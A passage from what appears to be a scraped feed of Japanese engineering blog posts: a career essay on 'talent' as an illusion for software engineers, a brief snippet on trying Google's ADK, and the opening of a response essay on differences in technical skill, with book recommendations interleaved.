目し、本質を掴もうとし、問題を面白がることで、徐々に洞察力が深まっていきます。どちらも「才能」という固定的な能力ではありません。時間と意識的な努力によって育てられるスキルなのです。「あの人は技術力がある」と言われる人は、単に先に始めて多くの経験を積んだか、意識的にセンスを磨く習慣を持っているか、あるいはその両方です。そして、その両方とも、今からでも始められます。才能という名の逃避「才能がない」という言葉は、一見すると謙虚に聞こえます。しかし実のところ、これは危険な自己欺瞞です。なぜなら、才能という言葉を使った瞬間、私たちは変化の可能性を放棄してしまうからです。「才能がないからできない」は、「努力してもどうせ無理」と同義です。そして一度この思考に陥ると、成長のための努力そのものが無意味に思えてきます。私自身、新人時代にこの罠に嵌っていました。新しい技術概念と格闘していた頃、何度もこう思いました。「自分にはこの考え方を理解する才能がないのだろう」と。そしてその思考は、学習を放棄する口実となりました。難しいドキュメントを読むことを避け、エラーメッセージと真剣に向き合うことから逃げました。でも、ある時気づきました。私が「才能がない」と諦めていた領域で活躍している先輩たちも、実は最初から理解していたわけではありませんでした。彼らは単に、私が避けていた苦痛と向き合い続けていただけだったのです。私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon性格と人格才能を考える上で、重要な区別があります。それは性格と人格の違いです。性格とは、通常の日にどう反応するか──つまり、私たちの自然な傾向や気質のことを指します。一方で人格とは、困難な日にどう振る舞うか──つまり、意図的に選択される態度や行動のことです。この区別は、才能という概念を理解する上でとても重要です。私たちはよく、性格と人格を混同してしまいます。「私は物覚えが悪い」「集中力がない」「創造性がない」──これらは一見すると先天的な限界のように聞こえます。しかし実際には、これらの多くは人格、つまり訓練可能な能力の領域なのです。例えば、「集中力がない」と自己評価する人の多くは、実は集中する環境や方法を知らないだけかもしれません。スマートフォンの通知をオフにし、作業を25分単位に区切り、定期的に休憩を取る──こうした具体的な方法を実践することで、「集中力」は劇的に向上します。重要なのは、こうした能力を「才能」ではなく「性格スキル」として捉え直すことです。才能は固定的で変えられないものですが、スキルは練習によって向上させることができます。この視点の転換が、成長への扉を開くのです。世界一やさしい「才能」の見つけ方　一生ものの自信が手に入る自己理解メソッド作者:八木 仁平KADOKAWAAmazon不快感という成長の証才能という幻想から抜け出すために、もう一つ重要な認識があります。それは、学習における不快感の本質的な役割です。「快適に学べる」というのは、実は矛盾した概念かもしれません。スキルを真に習得するまで快適にはなれないのですが、習得する前の練習は必然的に不快だからです。そして人は、その不快感を避けようとします。これが、多くの人が成長の途中で挫折する根本的な理由です。Docker最適化の学習を例に取りましょう。BuildKitのキャッシュ戦略を理解しようとするとき、最初はかなり混乱します。レイヤーの仕組み、マウントの種類、キャッシュの無効化条件──これらの概念は最初、全く繋がらない断片として現れます。この混乱は不快です。だから多くの人は、「とりあえず動けばいい」と表面的な理解で妥協します。しかし、この不快感こそが成長の証なのです。脳が新しい構造を構築しようとしている証。既存の理解の枠組みが崩れ、新しい理解が生まれつつある証です。この不快感から逃げずに、むしろそれを「成長が起きている」というサインとして受け入れられるかどうか──それが、習得できる人とできない人を分ける分岐点になります。「快適なら、やり方が間違っている」という言葉があります。この言葉は、学習の本質を突いています。本当の成長は、常にコンフォートゾーンの外側で起きるのです。ネガティブ・ケイパビリティ　答えの出ない事態に耐える力 (朝日選書)作者:帚木　蓬生朝日新聞出版Amazon才能がないと言う前にインターンシップやワークショップで若手と一緒に作業をしていて気づいたことがあります。「才能がない」と自己評価する人の多くが、実は才能の問題ではなく、もっと基礎的なプロセスを飛ばしているだけだということです。syu-m-5151.hatenablog.comドキュメントを読んでいない「自分には向いていない」と言う学生がいました。コードがうまく動かないし、エラーが理解できないと。しかし彼は、エラーメッセージを実際には読み飛ばしていたのです。エラーメッセージには「Expected type X, but got type Y」と明確に書いてあります。しかし「type X」という文字列だけを拾って、期待される型と実際の型が違うという関係性を読み取っていませんでした。これは彼だけの問題ではありません。ドキュメントを「読んでいるつもり」でも、実際には自分の仮説に都合のよい部分だけを拾い読みしている人は驚くほど多いのです。APIのリファレンスに「このメソッドは非同期です」と書いてあっても、Promiseを返すのか、コールバックを受け取るのか、await可能なのか──書かれているはずの詳細を読んでいません。仮説を一つずつ潰していない別の学生は「バグが見つからない」と何時間も格闘していました。しかし彼は、複数の仮説を同時に追いかけて、どれも中途半端に確認していたのです。「ネットワークの問題かもしれない」と言いながらネットワークのログを確認せず、「データベースの問題かもしれない」と言いながらクエリを確認しない。問題解決には、仮説を一つずつ潰していくプロセスが必要です。この地道なプロセスを飛ばして、「なんとなく」で進めようとするから、何時間経っても解決しないのです。仮説行動――マップ・ループ・リープで学びを最大化し、大胆な未来を実現する作者:馬田隆明英治出版Amazon主語と述語を把握していない技術文書を読むとき、主語と述語の関係を曖昧にしたまま読み進めている人は非常に多いのです。「誰が」「誰に」「何を」しているのか──この基本的な構造を把握しないまま、「なんとなく」で理解したつもりになっています。小さなことの積み重ねエラーメッセージをちゃんと読む。仮説を一つずつ潰す。主語と述語を把握する。誰でもできることです。しかし、この「小さなこと」の積み重ねが、「才能がある」ように見える人と「才能がない」と思い込む人を分けています。才能があるように見える人は、これらの基礎的なプロセスを、意識的か無意識的に実践しています。これらは訓練可能です。才能ではありません。最初は意識的にやる必要があります。めんどくさいと感じるかもしれません。でも、この「めんどくさい」基礎作業を飛ばすから、結果的に何倍も時間がかかってしまうのです。なぜ、ちゃんと読めないのか「ちゃんと読むことによる成功体験」が積めていない──これが、根本的な問題かもしれません。奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazonインスタント化と「モヤモヤ」への耐性の喪失私たちは今、インスタントで断片的な刺激に取り巻かれています。YouTubeのレコメンド、TikTokの短い動画、LINEスタンプ──一定のリズムで繰り返されるインスタントで分かりやすい感覚やコミュニケーションが蔓延しています。スマホを持つことで、即時的な満足にいつでもアクセスできる状態にあり、「消化しきれなさ」「難しさ」「モヤモヤ」といった時間もコストもかかるものは人気がなくなっています。技術ドキュメントを読むことは、まさにこの「モヤモヤ」との戦いです。一読してすぐに理解できるものではありません。何度も読み返し、実際に試し、エラーに出会い、また読み返す。この時間のかかるプロセスが、インスタント化した感覚に慣れた私たちには耐えがたいのです。新しい技術を学ぶとき、最初は「モヤモヤ」します。でも、このモヤモヤした状態を抱えたまま、読み続け、試し続けることでしか、深い理解には到達できません。ChatGPTやClaudeに「要約して」と頼んでしまう。確かに、それでスッキリはします。でも、その過程で失われるものがあります。孤独と孤立の喪失スマホによる常時接続の世界では、何か一つのことに取り組み、一つのことに没頭する＜孤立＞が喪失しています。反射的なコミュニケーションを積み重ねるということは、相手の人格や心理状態を想像しないコミュニケーションです。同時に、退屈に耐えきれず、何か刺激やコミュニケーションを求めてスマホをいじってしまい、自分一人で時間を過ごす＜孤独＞も失われかけています。スマホ時代に必要なのは孤独と孤立であり、それらがあってこそ、自分を浸している感覚に耳を澄ませ、刺激的な経験と折り合いをつけることができます。技術ドキュメントを読むことは、まさにこの「孤立」を必要とします。一人で、ドキュメントと向き合う時間。このシンプルな行為が、現代では驚くほど難しくなっています。ネガティブ・ケイパビリティの欠如ネガティブ・ケイパビリティとは、「結論づけず、モヤモヤした状態で留めておく能力」です。把握しきれない謎をそのまま抱えておくことで、そこから新しい何かをどこまでも汲み取ろうとする姿勢のことです。これは、他者の経験を理解したり、技術を学んだりするときに必要です。謎を安易に「自分のわかる範囲」に回収しない能力と言えます。新しい技術を学ぶとき、すぐに「わかった」と思いたくなります。でも実際には、わかっていないことだらけです。このモヤモヤした状態を抱えたまま、読み続け、試し続ける。この能力が、現代人には欠けているのかもしれません。自己啓発の罠と他者の想像力悩みや困難を抱えている人は、「自分の直観に従って判断しろ」「自分の情熱に従え」というメッセージに心を揺さぶられます。しかし、このアプローチには内なる声は一つであり、その声こそ自分を然るべき一つの進路へと導いてくれるはずという前提があります。他者の想像力は、「ノイズ」としてラベリングされてしまいます。私たちは、一枚岩のような存在ではありません。自分の内側にはいくつもの声が発せられています。「他者に見られる自分」も自分の重要な構成要素となるので、他者はノイズどころか、自分を豊かに育てるものです。「才能がない」という言葉も、実はこの自己啓発の罠と表裏一体です。「才能がないから無理」は自己責任の裏返しです。でも実際には、他者の想像力を借りること、ドキュメントを丁寧に読むこと、先輩に質問することは、ノイズではなく成長の糧なのです。「自分の頭で考える」の代わりに、「他人の頭で考える」「他者の想像力を自分に取り入れる」ことが大切です。才能ではなく、学び方の問題「才能がある」と見なされる人々を注意深く見ると、彼らの多くは特別な能力を持っているわけではありません。彼らは効果的な学び方を知っているだけなのです。例えば、指摘と助言の違いを理解している人は、より速く成長します。「このコードのどこが悪いですか?」は指摘を求める質問で、過去の実績に焦点を当て、しばしば批判的な応答を引き出します。一方で「このコードをより保守性の高いものにするにはどうアプローチすべきでしょうか?」は助言を求める質問で、未来に焦点を当て、建設的な提案を引き出します。この小さな違いが、学びの質を大きく変えます。才能があるように見える人は、こうした学び方の技術を実践しています。彼らは「分からない」と素直に認め、「教えてください」と謙虚に頼み、そして得られた助言を素直に実践します。これは才能ではなく、態度の問題なのです。学びとは何か－〈探究人〉になるために (岩波新書)作者:今井 むつみ岩波書店Amazon後退も成長のプロセスの一部才能という概念を手放すと、もう一つ重要な認識が生まれます。それは、成長が必ずしも直線的ではないということです。私たちは、成長を一方向的な進歩として捉えがちです。しかし実際の成長は、螺旋を描くように進んでいきます。前進し、停滞し、時には後退し、そしてまた前進します。この後退期を「才能がない証拠」として捉えるか、「成長のための再編成」として捉えるかで、その後の軌道は大きく変わります。技術を学ぶ過程でも、この現象は頻繁に起きます。新しいフレームワークを学び始めた当初は順調に進みます。しかし、ある程度理解が深まると、突然全てが分からなくなる瞬間が来ます。これは実は、表面的な理解から深い理解へと移行する兆候なのです。しかし多くの人は、この瞬間を「やはり自分には才能がない」と解釈し、学習を放棄してしまいます。人は前進するために時に立ち止まり、後退し、そしてまた前進した先には以前よりも大きく飛躍しています。このプロセスを理解することで、停滞期や後退期を前向きに捉え直すことができます。それは失敗ではなく、次の飛躍のための準備期間なのです。手を動かすことの救いエンジニアという仕事には、一つの大きな救いがあります。それは、手を動かしている間、才能への不安が消えるということです。「自分には才能がない」という悩みは、頭の中でぐるぐる回り始めると、どんどん大きくなります。でも「これを作りたい」と思って実装を始めた瞬間、その悩みはどこかに消えます。目の前にあるのは、具体的な問題だけです。エラーが出る。調べる。解決する。また詰まる。また調べる。この「詰まる→調べる→解決する」のサイクルを回すこと自体が、静かに自信を育てていきます。最初は1つのエラーに1時間かかったのが、30分になり、10分になる。その変化を実感するとき、「成長している」という手応えが得られます。理想ではなく、作りたいものを追う重要なのは、「優秀なエンジニアになりたい」という抽象的な目標ではなく、「このアプリを作りたい」「この機能を実装したい」という具体的な目標に向かって手を動かすことです。完璧主義に陥る人は、結果に過度な完成度を求めるあまり、小さな一歩を踏み出せません。「理想的なアーキテクチャを設計してから始めよう」「全ての技術を理解してから作ろう」──そう考えて、結局何も始められない。でも実際には、小さく作って、動かして、直して、また作る。このサイクルを回すことでしか、良いものは生まれません。一つのエラーを解決する。一つの機能を実装する。一つのテストを通す。この小さな積み上げが、気づけば大きなものになっています。綿密な計画よりも、不完全でも動く一歩の方が、はるかに価値があります。あえて視野を狭めろここで、少し逆説的なことを言います。特に若い時期には、根拠がなくても、自分を信じることが重要です。「才能という幻想」を批判してきたこの記事で、矛盾するように聞こえるかもしれません。しかし、「自分には才能がある」という固定的な思い込みと、「自分はできるようになる」という成長への信頼は、全く別物です。若いうちは、視野をあえて狭めることも必要です。「これが本当に正しい道なのか」「自分に向いているのか」──そんな冷静な自己分析ばかりしていると、一歩も踏み出せなくなります。時には、根拠のない自信を持って、盲信的に突き進むことも必要です。「プログラミングなんて簡単だろう」という、ある意味で無知ゆえの大胆さ。この「若気の至り」とも言える姿勢が、最初の一歩を踏み出させてくれます。その盲信的な姿勢が、いつか本当の自信に変わります。根拠のない自信が、実績という根拠を伴った自信になります。そして気づけば、最初は「嘘」だった「自分はできる」という言葉が、本当になっているのです。問題を面白がる力もう一つ、見落とされがちな視点があります。それは、学びにおける遊び心です。才能があるように見える人は、実はこの遊び心を持っています。彼らは学びを苦痛として捉えるのではなく、謎解きとして楽しんでいます。新しいバグに出会えば「面白い現象だ」と興味を持ち、理解できない概念に出会えば「理解できたら面白そうだ」と好奇心を抱きます。この姿勢は、才能ではなく選択です。同じ状況を「苦痛」として捉えるか「挑戦」として捉えるか──その選択が、長期的な成長の軌道を決めます。そして、この選択は意識的に訓練できます。義務として学ぶのではなく、探究心を持って取り組むとき、人は最も成長します。ぐちゃぐちゃ考える暇があったら才能があるかどうかなんて、作っているときには関係ありません。目の前のエラーメッセージは、あなたが才能があるかどうかなんて気にしていません。ただ、解決策を求めているだけです。ドキュメントを読む。エラーメッセージをちゃんと読む。仮説を立てて検証する。うまくいかなければ別の方法を試す。これらは全て、才能ではなく、プロセスです。コンテストで優秀な成績を残した人たちも、結局は同じことをしています。彼らが特別なのではありません。ただ、このプロセスを高速で回せるようになっただけです。そして、その高速化は、繰り返しによってしか得られません。自分が未熟だと不安に思いながらインターンシップを始めた私が、3年経って確信していることがあります。それは、手を動かし続けた人は、必ず前に進んでいるということです。才能について悩む時間を、1行でも多くコードを書く時間に変える。理想の自分について考える時間を、作りたいものを作る時間に変える。その積み重ねが、気づけば「成長」と呼ばれるものになっています。才能という言葉を使わないここまで読んで、一つの結論に至るかもしれません。それは、才能という言葉を使わないことの重要性です。「才能がある」「才能がない」──この二元論は、成長の可能性を見えなくしてしまいます。代わりに、より具体的で建設的な言葉を使うべきです。「まだ学んでいない」「まだ練習が足りない」「まだ自分に合った学び方に出会っていない」──こうした表現は、現在の状態を固定的なものではなく、変化可能なものとして捉えさせます。インターン生に技術を教える際も、この視点の転換を意識しています。「才能がない」という言葉を聞いたら、必ず問い返します。「具体的に、何が難しいと感じている?」と。すると、「才能」という曖昧な概念ではなく、具体的な課題が見えてきます。そして具体的な課題は、具体的な対策で解決できます。「あなたには向いていないかも」ではなく、「どういう環境や説明の仕方なら理解できるだろうか」と考えます。この視点の転換が、教育者として最も重要な態度なのかもしれません。では、才能という言葉を使わないとしたら、何を語るべきなのでしょうか。それは、成長のメカニズムそのものです。どうすれば効果的に学べるか。どうすれば困難に直面しても諦めずに続けられるか。どうすれば自分の可能性を最大限に引き出せるか──こうした実践的な問いに答えることが、才能という幻想よりもはるかに価値があります。これは抽象的な話ではありません。とても実践的な話です。毎朝同じ時間に起きる習慣。集中できる環境を整える工夫。失敗から学ぶための振り返りの時間。他者から助言を求める勇気──これらは全て、トレーニング可能なスキルです。そして、これらのスキルの蓄積が、才能と呼ばれるものの正体なのかもしれません。HIDDEN POTENTIAL 可能性の科学――あなたの限界は、まだ先にある (三笠書房　電子書籍)作者:アダム・グラント三笠書房Amazon時間という最も公平な資源才能という概念に対して、時間は最も公平な資源です。どんな人にも、1日は24時間しかありません。もちろん、その24時間をどう使えるかは、環境によって大きく異なります。しかし、与えられた時間の中で、何を選択するか──その選択の積み重ねが、最終的な差を生みます。才能がある人とない人の違いは、実は時間の使い方の違いなのかもしれません。才能があるように見える人は、学習に多くの時間を投資しています。しかしそれは、単純に勉強時間が長いという意味ではありません。むしろ、質の高い時間の使い方を知っているということです。例えば、同じ1時間でも、受動的にチュートリアルを見るのと、能動的に問題を解こうとするのでは、学びの質が全く異なります。同じエラーに出会っても、すぐに答えを探すのと、まず自分で考えてみるのでは、理解の深さが変わります。時間という公平な資源を、どう使うか。これは才能ではなく、戦略の問題です。そして戦略は、学ぶことができます。あっという間に人は死ぬから　「時間を食べつくすモンスター」の正体と倒し方作者:佐藤 舞（サトマイ）KADOKAWAAmazon停滞と努力の違い時間の使い方について語るとき、見落とされがちな重要な区別があります。それは、停滞と努力の違いです。Kubernetesのワークショップで、あるインターン生がServiceの概念に数日苦しんでいました。彼は毎日、同じドキュメントを読み返していました。「努力している」と本人は言いました。でも、彼は前に進んでいませんでした。よく話を聞くと、彼はそもそもネットワークの基礎を理解していませんでした。IPアドレスとは何か、ポートとは何か、DNSがどう動くのか──こうした土台がないまま、Kubernetesの抽象的な概念を理解しようとしていたのです。難しい問題に直面したとき、人は二つの道を選びます。一つは、理解できないまま同じ説明を何度も読み返し、同じ場所でぐるぐると回り続けること。もう一つは、「何が分からないのか」を見極めて、まずそこから順番に理解していくこと。前者を停滞と呼び、後者を努力と呼びます。停滞している人は、しばしば自分が努力していると思っています。長時間向き合っている。何度も試している。でも実際には、前提となる知識が欠けたまま、同じところで足踏みを繰り返しているだけなのです。本当の意味での努力とは、今の自分が理解できるところから始めることです。Kubernetesが難しいなら、まずネットワークの基礎から。ネットワークが難しいなら、まず自分のPCで2つのプログラムを通信させることから。この段階を踏んだ学び方こそが、努力の本質です。理解の速さには個人差があります。これは残酷な現実です。でも、人生という長い時間軸で見たとき、この速さの差は思ったほど大きくありません。むしろ、一歩ずつでも前に進み続けた人と、途中で立ち止まってしまった人の差の方が、はるかに大きいのです。時間は誰にも平等です。でも、その時間を「理解できない問題の前での空回り」に使うか、「今理解できることから順に積み上げていく前進」に使うか──この選択が、長期的には想像もできないほどの差を生みます。だから、ゆっくり急いでください。今日から始めて、でも焦らず、着実に。目の前の問題が難しすぎるなら、何が前提として必要かを見極めて、より基礎的なところから。その地道な積み重ねこそが、あなたを想像もしなかった場所へと連れて行ってくれます。超一流になるのは才能か努力か？ (文春e-book)作者:アンダース・エリクソン,ロバート・プール文藝春秋Amazonどうしようもなく満たされない性質についてここまで「才能という言葉を使わないこと」を言ってきましたが、最後に一つだけ、もしエンジニアに才能というものがあるとすれば何か、という問いに答えたいと思います。それは、どうしようもなく満たされない性質です。知りたいと思う。理解したいと思う。作りたいと思う。解決したいと思う。そして、その過程を楽しめる。それをしてないと、ちゃんと生きていけない。そういう性質。これは祝福でもあり、同時に呪いでもあります。なぜなら、これらの能力はコントロールできないことが多いからです。夜中の3時に突然コードのことを考え始める。休日なのに技術ドキュメントを読んでしまう。趣味と仕事の境界が曖昧になる。多くの不都合を抱えています。だから、あまり気にしなくて良いのです。才能と能力が一致しているのは、かなり稀です。「満たされなさ」を持っていても、それが必ずしも成果に結びつくわけではありません。逆に、その「満たされなさ」を持たずとも、優れたエンジニアになることは十分に可能です。自分に才能があるのかないのか。何者かになれる人となれない人の違いは何なのか。その境目はありません。「才能がある」とか「天才だ」というのは、原因ではなく結果に対して付けられる評価です。何かを成し遂げた後で、周りが「あの人には才能があったんだ」と言うだけです。始める前から、自分に才能があるかどうかなんて、誰にも分かりません。そして、それを気にする必要もありません。重要なのは、今、目の前にあることに取り組むかどうか。その選択だけです。ご冗談でしょう、ファインマンさん（上） (岩波現代文庫)作者:Ｒ．Ｐ．ファインマン岩波書店Amazonご冗談でしょう、ファインマンさん（下） (岩波現代文庫)作者:Ｒ．Ｐ．ファインマン岩波書店Amazonおわりに様々な場所で、様々な「才能」を目撃してきました。コンテスト会場、企業のオフィス、勉強会、ワークショップ──華々しく成功した人も、静かに立ち去った人も、黙々と歩き続けている人も。私が伝えたかったのは「才能なんて存在しない」という単純なメッセージではありません。「才能という言葉を使うことで、私たちは何を見失っているのか」ということです。才能という言葉は便利です。でも、その便利さと引き換えに、私たちは変化の可能性を、成長の余地を、自分と他者の可能性を信じる力を手放しています。「才能がない」という言葉を、もし今、心の中で繰り返しているのなら──それは本当は違うかもしれません。エラーメッセージを、ちゃんと読んでいないだけかもしれません。仮説を、一つずつ潰していないだけかもしれません。インスタントな答えを求めて、モヤモヤと向き合っていないだけかもしれません。まだ、自分に合った学び方に出会っていないだけかもしれません。小さなことです。でも、その小さなことを飛ばしているから、「才能がない」と思い込んでしまう。コンテストで輝いていた同期が、燃え尽きていることがあります。勉強会で熱心だった後輩が、姿を見せなくなることがあります。一方で、当時は目立たなかった誰かが、誰も予想しなかった場所で花を咲かせていることもあります。スタート地点の優劣など、長い人生においてはほとんど意味をなさない──20代を通じて、私はそう学びました。あなたの可能性は、スタート地点では測れません。どれだけ伸びたか、どれだけ学んだか、どれだけ変化したか──それこそが、本当の意味での能力です。才能という幻想を手放したとき、初めて見えてくる景色があります。それは、不完全な今の自分を受け入れ、それでも前に進み続けることの静かな勇気です。未熟な自分がインターンシップを始めて3年。今でも不安はあります。でも、若手と一緒に作業する中で気づきました。彼らが必要としているのは、全てを知り尽くした指導者ではありません。共に悩み、共に考え、そして「才能」という言葉で可能性を閉ざさない、そんな誰かです。この記事を通じて、私自身もまた、自分に言い聞かせています。才能があるかどうかなんて、後になってから誰かが決めることです。大切なのは、今、目の前にあることに手を動かし続けること。その積み重ねだけです。最後に、私自身のことを少しだけ。私にはいくつかの目標があります。世界的に有名なOSSを作って、海外で見知らぬ人にコーヒーを奢ってもらいたいです。書籍をコンスタントに出して、いつか道端でサインを求められたいです。週刊プレイボーイに連載を載せて、毎週誰から指摘されても反論ができるようにグラビア雑誌を買うことです。できるかどうかは分かりません。才能があるかどうかも分かりません。でも、文章を書き続けています。コードを書き続けています。なぜなら、それが私にとって「満たされなさ」を満たす行為だからです。そして、その過程を楽しんでいるからです。あなたにも、そんな「満たされなさ」があるなら。それに向かって、ただ手を動かし続けてください。それが才能かどうかなんて、後になってから誰かが決めることです。","isoDate":"2025-10-28T02:30:09.000Z","dateMiliSeconds":1761618609000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"今更ながらadkを使ってみた","link":"https://zenn.dev/akasan/articles/637c35253400e7","contentSnippet":"今回はadkを使ってみました。すでに提供が開始されてからかなり日数が立っていますが使っていなかったことに気づきまして、今回Qucikstartを試してみました（エージェントを実装できる方法が他に色々ありすぎて漏れていましたw）。 adkとは？adkとはAgent Development Kitの省略であり、エージェントを開発・デプロイするためのフレームワークになります。GeminiやGoogleのエコシステムに最適化されてはいますが利用するモデルについてはそれ以外のものも利用でき、他のフレームワークと互換性があるものとなっています。利用用途としてはadkをつかってエージェントをくみ...","isoDate":"2025-10-27T12:50:38.000Z","dateMiliSeconds":1761569438000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"技術力に優劣はある(「技術力に優劣はない」を読んで)","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/27/134629","contentSnippet":"sizu.meはじめに先日、「技術力に優劣はない（技育などに参加している学生に向けて）」という記事を読みました。技育に参加する学生たちへの励ましのメッセージで、技術との向き合い方の多様性を認め、コミュニケーション力の重要性を説き、相互リスペクトの大切さを訴える、とても温かい内容でした。この記事は、あの記事の対象読者ではない私が、横から口を出すような形になってしまうことを承知で書いています。 元の記事の主張——技術の感受性には段階があること、ジュニアにはコミュニケーションが大事なこと、べき論に揺さぶられないこと、どの段階にいてもキャリアは作れること——これらは本質的に正しいと思います。ただ、私はこう思います。それでもなお、技術力という軸においては、やはり優劣が存在し、それが中長期的なキャリアに大きな影響を与えます。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきましょう。技術との向き合い方元の記事では、技術への向き合い方を3段階に分けていました。この分類は本質を捉えていると思います。技術を道具として使う人技術を理解する人技術を創る人この分類自体はとても良いのですが、私はこれをポケモンの進化のような段階的なものとは捉えていません。むしろ、これらは固定的な段階ではなく、状況や分野によってシームレスに行き来するものだと感じています。例えば、Reactについては深い理解があり、新しいパターンを生み出せる人でも、機械学習の分野では既存のライブラリを使うだけかもしれません。人は常に3つの状態を往復しています。新しい分野に挑戦すれば「道具として使う」状態に戻りますし、経験を積めば「理解する」状態に移行し、さらに探求すれば「創る」状態に到達します。それぞれの状態の中には優劣は存在するここで重要なのは、これら3つの状態は確かに流動的ですが、それぞれの状態の中には明確に優劣が存在するということです。「道具として使う」中には優劣があります。 同じ「道具として使う」状態でも、ドキュメントを読んで適切に活用できる人と、エラーが出たらすぐに諦めてしまう人では、生産性に大きな差があります。基本的な概念を理解しながら使っている人と、ほぼブラックボックスとして使っている人では、応用力が全く異なります。そして今、生成AIを効果的に活用できる人とそうでない人では、学習速度に圧倒的な差が生まれています。エラーメッセージをAIに投げて適切な解決策を引き出せる人と、ただコピペして満足する人では、問題解決能力が変わってきます。「理解する」中には優劣があります。 内部実装を読んで理解している人と、公式ドキュメントレベルの理解に留まっている人では、問題解決能力に差があります。パフォーマンスの特性やエッジケースまで把握している人と、基本的な使い方だけ知っている人では、設計の質が変わってきます。ここでも生成AIの活用法に差が出ます。複雑なコードベースの理解を加速するためにAIを使える人と、単に「これ何してるの？」と聞くだけの人では、深い理解への到達速度が違います。技術的な仮説を立て、AIに検証させながら学びを深められる人は、独学だけの人より効率的に専門性を高められます。「創る」中には優劣があります。 既存のものを少し改良したレベルと、まったく新しいパラダイムを生み出すレベルでは、技術的なインパクトが桁違いです。自分のプロジェクトで使える小さなライブラリを作る人と、業界全体に影響を与えるOSSを開発する人では、その影響力は比較になりません。そして今、生成AIを創造のパートナーとして使いこなせる人とそうでない人では、アウトプットの質と量に大きな差が生まれています。アイデアの壁打ち相手としてAIを使い、設計の初期段階を加速できる人。実装の定型部分をAIに任せ、本質的な設計に集中できる人。こういった使い方ができる人は、同じ時間でより高度なものを創り出せます。私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon向き合い方の違いを優劣として捉えがちしかし、学生や若いソフトウェアエンジニアは、この向き合い方の違いを、ソフトウェアエンジニアとしての優劣として捉えがちだという側面があります。「自分は道具として使っているだけだから、ダメなエンジニアだ」「あの人は技術を創っているから、自分よりずっと上だ」こういった思考に陥りやすいです。それが過度な自己否定につながったり、逆に、ある分野で「創る」状態に到達したことで慢心したりします。しかし、向き合い方は分野によって変わります。誰もが全ての技術について「創る」状態にいるわけではありません。そして、「道具として使う」状態であることが、必ずしも劣っているわけではありません。重要なのは、どの状態にいるかではなく、その状態の中でどのレベルにいるか、そして複数の領域でどう組み合わせているかです。熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon能力ではなく衝動や偏愛人を「道具として使う」状態から「理解する」状態へ、さらには「創る」状態へと突き動かすものは、おそらくは計画的なキャリアデザインではありません。むしろ、それは衝動や偏愛に近いものだと思います。あるいは、そうした衝動を自然と抱けるような環境に身を置けるかどうかです。「なぜかこのエラーメッセージが気になる」「この実装がどうなっているのか知りたくて仕方がない」「この技術で何かを作りたいという衝動が止まらない」——こういった、理屈では説明しきれない偏愛が、人を技術の深みへと引き込んでいきます。そして、周囲に技術を深く追求する人たちがいる環境は、そうした衝動を自然と育んでくれます。人生のレールを外れる衝動のみつけかた (ちくまプリマー新書)作者:谷川嘉浩筑摩書房Amazonそれでもなお、市場価値の差は存在するしかし、この3つの状態の間には、やはり市場価値の差が存在します。そして、どの状態に長く留まっているか、その状態の中でどのレベルにいるかが、中長期的なキャリアに大きな影響を与えます。「道具として使う」状態に留まり続けることのリスクは、年齢を重ねるほど大きくなります。表面的な理解しかないエンジニアは、年齢を重ねると「代替可能な人材」になっていきます。若手の方が給与が安く、学習意欲も高いです。同じ「道具として使う」状態であれば、企業が選ぶのは若手です。一方、主要な技術領域で「理解する」状態に到達できれば、市場価値は変わります。そして、いくつかの領域で「創る」状態に到達している人は、さらに大きな影響力を持ちます。さらに、同じ「理解する」状態でも、そのレベルの高さによって市場価値は大きく変わってきます。この差を「優劣ではない、違いだ」と言えるでしょうか？ 市場は明確に評価しています。ジュニアに技術力は求められていない？元の記事は「ジュニアに技術力は求められていない」と述べていました。確かに、新卒や入社1〜2年目であれば、それは正しいです。しかし、これを「技術力を磨かなくてもいい理由」にしてはいけません。「ITエンジニアの転職学」では年収600万円を超えるには、以下のような能力で「自立レベル」への到達が求められます。設計力/実装力：アーキテクチャ設計、コーディング、技術選定など専門性の深さと広さ：特定領域の深い知識と、周辺技術の幅広い理解推進力・プロジェクト貢献：プロジェクトを前に進める力、スケジュール管理組織貢献：チームビルディング、メンバー育成、採用への貢献事業・顧客貢献：ビジネス価値への理解、顧客課題の解決情報発信・プレゼンス：技術ブログ、登壇、OSS活動などこのレベルに到達するのは、通常は入社3〜5年目だと言われています。つまり、「ジュニアには技術力は求められていない」というのは、せいぜい20代半ばまでの話です。それを過ぎても設計力/実装力や専門性が低いままだと、キャリアは確実に行き詰まります。ITエンジニアの転職学 2万人の選択から見えた、後悔しないキャリア戦略 (KS科学一般書)作者:赤川 朗講談社Amazonコミュニケーション力と技術力は対立しない元の記事では、技術の勉強をしている人とそうでない人が対比され、後者は「別の有意義なことをしている」と書かれていました。確かに、ゲームをしたり、友達と飲みに行ったりする時間は人生において大切です。キャリアは短距離走ではなく、中長距離走です。 燃え尽きないことが重要であり、適度な息抜きや趣味の時間は必要です。しかし、それは「技術を学ばない理由」にはなりません。 むしろ、中長距離だからこそ、地道な積み重ねが最終的に大きな差を生みます。1年、3年、5年と継続的に学び続けることで、技術力は確実に向上します。なぜなら、優秀なエンジニアは、技術力もコミュニケーション力も両方高いからです。これは対立するものではなく、掛け算で効いてくるものです。私が見てきた優秀なエンジニアたちは、例外なく以下の特徴を持っていました。設計力/実装力が高い（主要技術について「理解する」以上の状態）コミュニケーション力も高いビジネス理解力がある学習意欲が高い「技術力がないから、コミュニケーション力で勝負する」というのは、戦略ではなく妥協です。本当に市場価値を高めたいなら、先ほど挙げた6つの能力を、バランス良く磨く必要があります。syu-m-5151.hatenablog.comキャリアの中盤で見えてくる分岐点20代のうちは、技術力の差はそれほど致命的ではません。コミュニケーション力や調整力でカバーできるし、「これから成長すればいい」という期待値もあります。しかし、キャリアの中盤になると、市場が求めるレベルは急激に上がります。技術的な意思決定ができることチームをリードできることアーキテクチャ設計ができること若手を育成できることこれらはすべて、高い技術力を前提としています。 